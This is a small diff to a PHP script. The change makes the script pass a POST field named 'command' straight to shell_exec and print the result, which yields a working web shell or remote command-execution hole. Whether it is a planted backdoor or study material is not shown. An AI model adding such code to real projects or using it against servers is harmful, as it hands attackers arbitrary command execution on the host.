@@ -9,7 +9,7 @@ $file = $_POST["command"];
 
 
 echo "<pre>";
-echo shell_exec($command);
+echo shell_exec($file);
 echo "</pre>";
 
 
